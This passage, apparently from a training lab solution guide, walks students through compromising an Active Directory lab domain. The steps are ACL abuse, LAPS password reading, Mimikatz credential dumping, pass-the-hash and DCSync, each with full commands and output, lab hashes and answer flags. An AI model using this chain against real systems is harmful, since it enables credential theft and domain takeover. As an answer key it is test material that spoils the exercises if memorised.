64ea533bc503c900b5ecc1a20fcf9494838308fe4279a1448e1729810475aec029141d64d94ea939d0dcccf2799e1f0a91336a5da7d84a4c9f6505bb555c3fe06fe7c0654513017a77b473620fa8aa788a0ebcf056de179c9026e2e9a480981bc187aa1773794f0ca72428cd655b6b7f6ab01fb350a3791d5f3fa3fe34b86036be90471c48c204e79451a416312d6fc14b783dd5d23657d7f5159f819c2f56e79913d999ad8f1606fdb27207b4018c5742849386e374ef35c6eb44d9add2fd8a2029f530c8a735fd27573471e8b67c0c3bf46794260ead134bae7ed90b3a696335e3e0ff70b3219315058d55ccf64be599db3fcf3dc:ilovejesus

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
<SNIP>
```

Answer: `ilovejesus`

# Skills Assessment

## Question 3

### "Find the credentials to connect via RDP to WS01 and submit the flag in the Administrator's desktop as the answer. Use port 13389 to connect to WS01."

Now that `mathew` is compromised, students need to use the same `BloodHound` session from question 1 to inspect the account's `First Degree Object Control` and discover that it has `WriteOwner` permissions over `Network Admins`:

![[HTB Solutions/CAPE/z. images/fc093a4773fdbe6a879c43937ee7d485_MD5.jpg]]

When viewing the `First Degree Object Control` of `Network Admins`, students will notice the existence of a [`ReadLAPSPassword`](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#readlapspassword) edge between `Network Admins` and `WS01`. Consequently, the group `Network Admins`, along with its members, has the `ReadProperty` access right over the `ms-MCS-AdmPwd` attribute. This enables `Network Admins` to read the `LAPS` password of `WS01`:

![[HTB Solutions/CAPE/z. images/bbd2078451b74a50d657cce5c50a859e_MD5.jpg]]

Therefore, given that `Mathew` has `WriteOwner` privileges over `Network Admins` and `Network Admins` can read the `LAPS` password of `WS01`, students must exploit these relationships to access the `LAPS` password of `WS01`. First, students need to change the ownership of the group `Network Admins` to `Mathew`, to do so, they need to download [owneredit.py](https://raw.githubusercontent.com/ShutdownRepo/impacket/owneredit/examples/owneredit.py):

Code: shell

```shell
wget -q https://raw.githubusercontent.com/ShutdownRepo/impacket/owneredit/examples/owneredit.py
```

```
┌─[eu-academy-1]─[10.10.14.217]─[htb-ac-413848@htb-gykj8odpqt]─[~]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/ShutdownRepo/impacket/owneredit/examples/owneredit.py
```

Subsequently, using `owneredit.py`, students need to assign the `ownership` of `Network Admins` to `mathew`:

Code: shell

```shell
python3 owneredit.py -action write -new-owner mathew -target "Network Admins" -dc-ip STMIP inlanefreight.local/mathew:ilovejesus
```

```
┌─[eu-academy-1]─[10.10.14.217]─[htb-ac-413848@htb-gykj8odpqt]─[~]
└──╼ [★]$ python3 owneredit.py -action write -new-owner mathew -target "Network Admins" -dc-ip 10.129.205.122 inlanefreight.local/mathew:ilovejesus

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Current owner information below
[*] - SID: S-1-5-21-69916981-3983157826-2554592156-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=inlanefreight,DC=local
[*] OwnerSid modified successfully!
```

Now that `Mathew` is the `owner` of `Network Admins`, he is implicitly granted `WriteDacl` (and `ReadControl`) over the group. Therefore, students should use `dacledit.py` to grant `Mathew` `FullControl` over `Network Admins`:

Code: shell

```shell
python3 examples/dacledit.py -principal mathew -target "Network Admins" -dc-ip STMIP inlanefreight.local/mathew:ilovejesus -action write -rights FullControl
```

```
(.dacledit) ┌─[eu-academy-1]─[10.10.14.217]─[htb-ac-413848@htb-gykj8odpqt]─[~/impacket]
└──╼ [★]$ python3 examples/dacledit.py -principal mathew -target "Network Admins" -dc-ip 10.129.205.122 inlanefreight.local/mathew:ilovejesus -action write -rights FullControl

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] DACL backed up to dacledit-20230615-155822.bak
[*] DACL modified successfully!
```

Subsequently, students need to add `mathew` to the `Network Admins` group using `net`:

Code: shell

```shell
net rpc group addmem "Network Admins" mathew -U inlanefreight.local/mathew%ilovejesus -S STMIP
```

```
┌─[eu-academy-1]─[10.10.14.217]─[htb-ac-413848@htb-gykj8odpqt]─[~]
└──╼ [★]$ net rpc group addmem "Network Admins" mathew -U inlanefreight.local/mathew%ilovejesus -S 10.129.205.122
```

Now that `mathew` inherits all the permissions of `Network Admins`, students will be able to read the `LAPS` password of `WS01`. To do so, students first need to clone [LAPSDumper](https://github.com/n00py/LAPSDumper) and move directories into it:

Code: shell

```shell
git clone https://github.com/n00py/LAPSDumper -q && cd LAPSDumper
```

Then, students need to use `laps.py` with the credentials `mathew:ilovejesus` to read the `LAPS` password(s) of `WS01`, for which `Network Admins` has been granted read permission. Students will discover that the `LAPS` password for `WS01` is `u7x37@b@[$Rn-]`:

Code: shell

```shell
python3 laps.py -u mathew -p ilovejesus -l STMIP -d inlanefreight.local
```

```
┌─[eu-academy-1]─[10.10.14.217]─[htb-ac-413848@htb-gykj8odpqt]─[~/LAPSDumper]
└──╼ [★]$ python3 laps.py -u mathew -p ilovejesus -l 10.129.205.122 -d inlanefreight.local

LAPS Dumper - Running at 06-15-2023 16:14:49
WS01 u7x37@b@[$Rn-]
```

Utilizing the credentials `Administrator:u7x37@b@[$Rn-]`, students need to RDP into `WS01` over port `13389`:

Code: shell

```shell
xfreerdp /v:STMIP:13389 /u:Administrator /p:'u7x37@b@[$Rn-]' /dynamic-resolution
```

```
┌─[eu-academy-1]─[10.10.14.217]─[htb-ac-413848@htb-gykj8odpqt]─[~/LAPSDumper]
└──╼ [★]$ xfreerdp /v:10.129.205.122:13389 /u:Administrator /p:'u7x37@b@[$Rn-]' /dynamic-resolution

[16:21:18:275] [7261:7262] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-413848/.config/freerdp
[16:21:18:276] [7261:7262] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-413848/.config/freerdp/certs]
[16:21:18:276] [7261:7262] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-413848/.config/freerdp/server]
[16:21:18:294] [7261:7262] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[16:21:18:294] [7261:7262] [WARN][com.freerdp.crypto] - CN = WS01.inlanefreight.local
[16:21:18:294] [7261:7262] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[16:21:18:295] [7261:7262] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[16:21:18:295] [7261:7262] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[16:21:18:295] [7261:7262] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.205.122:13389) 
[16:21:18:295] [7261:7262] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[16:21:18:295] [7261:7262] [ERROR][com.freerdp.crypto] - Common Name (CN):
[16:21:18:295] [7261:7262] [ERROR][com.freerdp.crypto] - 	WS01.inlanefreight.local
[16:21:18:295] [7261:7262] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.205.122:13389 (RDP-Server):
	Common Name: WS01.inlanefreight.local
	Subject:     CN = WS01.inlanefreight.local
	Issuer:      CN = WS01.inlanefreight.local
	Thumbprint:  34:c9:ce:f4:c0:14:8f:ec:25:ab:b7:73:1c:cd:74:c4:60:64:2d:b9:8e:9d:5f:6d:9c:32:8d:3a:7d:59:c3:18
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

At last, when viewing the contents of the file "flag.txt" on the Desktop, students will attain the flag `R3D1nLAPS_Is_F4N`:

![[HTB Solutions/CAPE/z. images/abfb2d99121c7617d903f41797fd17b4_MD5.jpg]]

Answer: `R3D1nLAPS_Is_F4N`

# Skills Assessment

## Question 4

### "What's Jose's NTLM hash?"

Using the same RDP session from the previous question, students need to run PowerShell, navigate to `C:\Tools\`, and use `Mimikatz` to extract all available provider credentials. Students will find that the NTLM hash of `Jose` is `fa61a89e878f8688afb10b515a4866c7`:

Code: powershell

```powershell
.\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
```

```
PS C:\Tools> .\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

<SNIP>

Authentication Id : 0 ; 261465 (00000000:0003fd59)
Session           : Batch from 0
User Name         : jose
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 6/15/2023 9:05:38 AM
SID               : S-1-5-21-69916981-3983157826-2554592156-1110
        msv :
         [00000003] Primary
         * Username : jose
         * Domain   : INLANEFREIGHT
         * NTLM     : fa61a89e878f8688afb10b515a4866c7
         * SHA1     : 8940efdb4ea1a5f3738b55347f53e456e41d43b4
         * DPAPI    : 1c069e345a62ba16fa26d4d1e7c52ef9
        tspkg :
        wdigest :
         * Username : jose
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : jose
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :

<SNIP>

mimikatz(commandline) # exit
Bye!
```

Answer: `fa61a89e878f8688afb10b515a4866c7`

# Skills Assessment

## Question 5

### "What's the content of the flag located at C:\\Users\\Administrator\\Desktop\\flag.txt?"

Using the same `BloodHound` session from question 1, students should view the `Shortest Paths` to the domain `INLANEFREIGHT.LOCAL` and observe a `WriteDacl` edge between `Jose` and `TechSupport`. Additionally, there is a `ReadGMSAPassword` edge between `TechSupport` and `Remote_SVC`:

![[HTB Solutions/CAPE/z. images/fa97f4d926ed70e77ea8ad92332deea9_MD5.jpg]]

![[HTB Solutions/CAPE/z. images/cede81dcc890836378f16f78b34d622a_MD5.jpg]]

Therefore, students must exploit these relationships to read the `gMSA` password of the `Remote_SVC` account and obtain a shell as `Remote_SVC` to continue compromising the domain.

First, students need to `overpass-the-hash` of `Jose`'s NTLM hash to forge a valid `TGT` Kerberos ticket:

Code: powershell

```powershell
.\mimikatz.exe privilege::debug "sekurlsa::pth /user:jose /ntlm:fa61a89e878f8688afb10b515a4866c7 /domain:inlanefreight.local /run:powershell.exe" exit
```

```
PS C:\Tools> .\mimikatz.exe privilege::debug "sekurlsa::pth /user:jose /ntlm:fa61a89e878f8688afb10b515a4866c7 /domain:inlanefreight.local /run:powershell.exe" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::pth /user:jose /ntlm:fa61a89e878f8688afb10b515a4866c7 /domain:inlanefreight.local /run:powershell.exe
user    : jose
domain  : inlanefreight.local
program : powershell.exe
impers. : no
NTLM    : fa61a89e878f8688afb10b515a4866c7
  |  PID  1708
  |  TID  1548
  |  LSA Process is now R/W
  |  LUID 0 ; 32020889 (00000000:01e89999)
  \_ msv1_0   - data copy @ 00000231AE0286A0 : OK !
  \_ kerberos - data copy @ 00000231AEAEDE98
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 00000231AE801198 (32) -> null

mimikatz(commandline) # exit
```

Within the new `PowerShell` session, students need to navigate to `C:\Tools\`, set the `ExecutionPolicy` to `Bypass` for the current user, and then import `PowerView`:

Code: powershell

```powershell
Set-ExecutionPolicy bypass -Scope CurrentUser -Force
Import-Module .\PowerView.ps1
```

```
PS C:\Tools> Set-ExecutionPolicy bypass -Scope CurrentUser -Force
PS C:\Tools> Import-Module .\PowerView.ps1
```

From `BloodHound`, students already know that `Jose` has `WriteDacl` over `TechSupport`; therefore, they need to use `Add-DomainObjectAcl` to grant `Jose` `All`/`FullControl` rights over `TechSupport`:

Code: powershell

```powershell
Add-DomainObjectAcl -TargetIdentity TechSupport -PrincipalIdentity jose -Rights All
```

```
PS C:\Tools> Add-DomainObjectAcl -TargetIdentity TechSupport -PrincipalIdentity jose -Rights All
```

Subsequently, students need to add `Jose` to the `TechSupport` group using `Add-DomainGroupMember`:

Code: powershell

```powershell
Add-DomainGroupMember -Identity TechSupport -Members jose 
```

```
PS C:\Tools> Add-DomainGroupMember -Identity TechSupport -Members jose
```

Now, students need to exit the PowerShell session launched with `Mimikatz` and launch a new one so that new privileges and memberships of `Jose` take effect:

Code: powershell

```powershell
.\mimikatz.exe privilege::debug "sekurlsa::pth /user:jose /ntlm:fa61a89e878f8688afb10b515a4866c7 /domain:inlanefreight.local /run:powershell.exe" exit
```

```
PS C:\Tools> .\mimikatz.exe privilege::debug "sekurlsa::pth /user:jose /ntlm:fa61a89e878f8688afb10b515a4866c7 /domain:inlanefreight.local /run:powershell.exe" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::pth /user:jose /ntlm:fa61a89e878f8688afb10b515a4866c7 /domain:inlanefreight.local /run:powershell.exe
user    : jose
domain  : inlanefreight.local
program : powershell.exe
impers. : no
NTLM    : fa61a89e878f8688afb10b515a4866c7
  |  PID  6008
  |  TID  5964
  |  LSA Process is now R/W
  |  LUID 0 ; 32385017 (00000000:01ee27f9)
  \_ msv1_0   - data copy @ 00000231AE0286A0 : OK !
  \_ kerberos - data copy @ 00000231AEAEE528
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 00000231AE8014C8 (32) -> null

mimikatz(commandline) # exit
Bye!
```

Being a member of `TechSupport`, `Jose` can read the `gMSA` password of `Remote_SVC`; therefore, within the new PowerShell session, students need to navigate to `C:\Tools\` and run `GMSAPasswordReader.exe` against `remote_svc`. Students will attain the RC4 hash `4FA9222103EB7085E24262E70CA692E5`:

Code: powershell

```powershell
.\GMSAPasswordReader.exe --accountname remote_svc
```

```
PS C:\Windows\system32> cd C:\Tools\
PS C:\Tools> .\GMSAPasswordReader.exe --accountname remote_svc

Calculating hashes for Current Value
[*] Input username             : remote_svc$
[*] Input domain               : INLANEFREIGHT.LOCAL
[*] Salt                       : INLANEFREIGHT.LOCALremote_svc$
[*]       rc4_hmac             : 4FA9222103EB7085E24262E70CA692E5
[*]       aes128_cts_hmac_sha1 : 96A068BD8356BD60F068A86AF47D1D29
[*]       aes256_cts_hmac_sha1 : CCEEE040A5CB063482A68FA1B28257335B21EECB6BA1DDA962BA6E5A2CEBB498
[*]       des_cbc_md5          : 85FE83CDF75BA175
```

With the hash `4FA9222103EB7085E24262E70CA692E5`, students need to use `Mimikatz` to perform an `overpass-the-Hash` attack to forge a valid `TGT` Kerberos ticket for `Remote_SVC`:

Code: powershell

```powershell
.\mimikatz.exe privilege::debug "sekurlsa::pth /user:remote_svc$ /ntlm:4FA9222103EB7085E24262E70CA692E5 /domain:inlanefreight.local /run:powershell.exe" exit
```

```
PS C:\Tools> .\mimikatz.exe privilege::debug "sekurlsa::pth /user:remote_svc$ /ntlm:4FA9222103EB7085E24262E70CA692E5 /domain:inlanefreight.local /run:powershell.exe" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::pth /user:remote_svc$ /ntlm:4FA9222103EB7085E24262E70CA692E5 /domain:inlanefreight.local /run:powershell.exe
user    : remote_svc$
domain  : inlanefreight.local
program : powershell.exe
impers. : no
NTLM    : 4fa9222103eb7085e24262e70ca692e5
  |  PID  2328
  |  TID  744
  |  LSA Process is now R/W
  |  LUID 0 ; 32488657 (00000000:01efbcd1)
  \_ msv1_0   - data copy @ 00000231AE5744F0 : OK !
  \_ kerberos - data copy @ 00000231ADE2FB28
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 00000231AEAE2898 (32) -> null

mimikatz(commandline) # exit
Bye!
```

Using the same `BloodHound` session from question 1, students will notice that `Remote_SVC` owns `MicrosoftSync`, granting it (implicitly) `WriteDacl` over `MicrosoftSync`:

![[HTB Solutions/CAPE/z. images/09377ad2a9173a4bd301a139bb795179_MD5.jpg]]

Therefore, students need to abuse this misconfiguration and grant `Jose` `All`/`FullControl` `access rights` over the `MicrosoftSync` group, and then add him to it; this effectively will grant `Jose` `DCSync` access rights inherited from `MicrosoftSync`:

![[HTB Solutions/CAPE/z. images/5518c9f59a3248f46d69bd2984149e28_MD5.jpg]]

First, using `Add-DomainObjectAcl`, students need to grant `Jose` `All`/`FullControl` `access rights` over `MicrosoftSync`:

Code: powershell

```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Import-Module .\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity MicrosoftSync -PrincipalIdentity jose -Rights All
```

```
PS C:\Tools> Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Add-DomainObjectAcl -TargetIdentity MicrosoftSync -PrincipalIdentity jose -Rights All
```

Subsequently, students need to exit the PowerShell session launched with `Mimikatz` as `remote_svc` and launch a new one with `jose` as the user, supplying his NTLM hash `fa61a89e878f8688afb10b515a4866c7` so that the new privileges and memberships take effect:

Code: powershell

```powershell
.\mimikatz.exe privilege::debug "sekurlsa::pth /user:jose /ntlm:fa61a89e878f8688afb10b515a4866c7 /domain:inlanefreight.local /run:powershell.exe" exit
```

```
PS C:\Tools> .\mimikatz.exe privilege::debug "sekurlsa::pth /user:jose$ /ntlm:fa61a89e878f8688afb10b515a4866c7 /domain:inlanefreight.local /run:powershell.exe" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::pth /user:jose$ /ntlm:fa61a89e878f8688afb10b515a4866c7 /domain:inlanefreight.local /run:powershell.exe
user    : jose$
domain  : inlanefreight.local
program : powershell.exe
impers. : no
NTLM    : fa61a89e878f8688afb10b515a4866c7
  |  PID  2696
  |  TID  1876
  |  LSA Process is now R/W
  |  LUID 0 ; 32803284 (00000000:01f489d4)
  \_ msv1_0   - data copy @ 00000231AE59D770 : OK !
  \_ kerberos - data copy @ 00000231AEAEE528
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 00000231AE8014C8 (32) -> null

mimikatz(commandline) # exit
Bye!
```

Now, students need to add `Jose` to the `MicrosoftSync` group using `Add-DomainGroupMember`:

Code: powershell

```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Import-Module .\PowerView.ps1
Add-DomainGroupMember -Identity MicrosoftSync -Members jose
```

```
PS C:\Tools> Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Add-DomainGroupMember -Identity MicrosoftSync -Members jose
```

Students then need to exit the PowerShell session launched with `Mimikatz` and launch a new one so that new privileges and memberships of `Jose` take effect:

```powershell
.\mimikatz.exe privilege::debug "sekurlsa::pth /user:jose /ntlm:fa61a89e878f8688afb10b515a4866c7 /domain:inlanefreight.local /run:powershell.exe" exit
```
```
PS C:\Tools> .\mimikatz.exe privilege::debug "sekurlsa::pth /user:jose /ntlm:fa61a89e878f8688afb10b515a4866c7 /domain:inlanefreight.local /run:powershell.exe" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::pth /user:jose /ntlm:fa61a89e878f8688afb10b515a4866c7 /domain:inlanefreight.local /run:powershell.exe
user    : jose
domain  : inlanefreight.local
program : powershell.exe
impers. : no
NTLM    : fa61a89e878f8688afb10b515a4866c7
  |  PID  1836
  |  TID  928
  |  LSA Process is now R/W
  |  LUID 0 ; 32910836 (00000000:01f62df4)
  \_ msv1_0   - data copy @ 00000231AE02AA50 : OK !
  \_ kerberos - data copy @ 00000231ADE2F498
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 00000231AEAE18A8 (32) -> null

mimikatz(commandline) # exit
Bye!
```

Subsequently, students need to perform a `DCSync` using `Mimikatz` (or with `secretsdump.py` from Linux) to attain the NTLM hash `09721250b7544a54058c270807c62488` of the `Administrator`:

```powershell
.\mimikatz.exe "lsadump::dcsync /user:Administrator"
```
```
PS C:\Tools> .\mimikatz.exe "lsadump::dcsync /user:Administrator"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /user:Administrator
[DC] 'inlanefreight.local' will be the domain
[DC] 'DC01.inlanefreight.local' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 6/2/2023 8:00:51 AM
Object Security ID   : S-1-5-21-69916981-3983157826-2554592156-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 09721250b7544a54058c270807c62488
    ntlm- 0: 09721250b7544a54058c270807c62488
    ntlm- 1: bdaffbfe64f1fc646a3353be1c2c3c99
    lm  - 0: 594ed9558e82c070c33006d56b2a8060
```

Students need to authenticate to the DC as the built-in domain administrator by `passing-the-Hash` `09721250b7544a54058c270807c62488` using any tool that supports `pth` (`wmiexe.py` will be used here):

```shell
wmiexec.py administrator@STMIP -hashes :09721250b7544a54058c270807c62488
```
```
┌─[eu-academy-1]─[10.10.14.217]─[htb-ac-413848@htb-gykj8odpqt]─[~/LAPSDumper]
└──╼ [★]$ wmiexec.py administrator@10.129.205.122 -hashes :09721250b7544a54058c270807c62488

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

At last, when reading the contents of the file at `C:\Users\Administrator\Desktop\flag.txt`, students will attain the flag `DCSync_2_CompRoMIs3_3V3rYTh1nG`:

```cmd
more C:\Users\Administrator\Desktop\flag.txt
```
```
C:\>more C:\Users\Administrator\Desktop\flag.txt

DCSync_2_CompRoMIs3_3V3rYTh1nG
```

Students can also `DCSync` the entire domain with `secretsdump.py` from Linux:

```shell
secretsdump.py administrator@STMIP -hashes :09721250b7544a54058c270807c62488 -just-dc-ntlm
```
```shell
┌─[eu-academy-1]─[10.10.14.217]─[htb-ac-413848@htb-gykj8odpqt]─[~]
└──╼ [★]$ secretsdump.py administrator@10.129.205.122 -hashes :09721250b7544a54058c270807c62488 -just-dc-ntlm

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:09721250b7544a54058c270807c62488:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:61d3d3aeb8890eb1a35ee5ee2985fa38:::
inlanefreight.local\jeff:1109:aad3b435b51404eeaad3b435b51404ee:7aafe2bf4cf3108966604684fafa71e8:::
inlanefreight.local\jose:1110:aad3b435b51404eeaad3b435b51404ee:fa61a89e878f8688afb10b515a4866c7:::
inlanefreight.local\david:1111:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
inlanefreight.local\carlos:1112:aad3b435b51404eeaad3b435b51404ee:05a57883ab46257fb973929ffda5dcc9:::
inlanefreight.local\belkis:1114:aad3b435b51404eeaad3b435b51404ee:64f8c637f167b10bb6ed29efbcfbdde6:::
inlanefreight.local\julio:1115:aad3b435b51404eeaad3b435b51404ee:1311f2db409a32ff0e36b9a92f075b81:::
inlanefreight.local\mathew:1116:aad3b435b51404eeaad3b435b51404ee:c18848d000210bf8b24d4fe74f5d41f8:::
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:96fe273f847ee2488e7862c9d7fafd48:::
WS01$:1105:aad3b435b51404eeaad3b435b51404ee:a638f804af684acb2661cf936218c6a9:::
remote_svc$:1608:aad3b435b51404eeaad3b435b51404ee:4fa9222103eb7085e24262e70ca692e5:::
[*] Cleaning up...
```

Answer: `DCSync_2_CompRoMIs3_3V3rYTh1nG`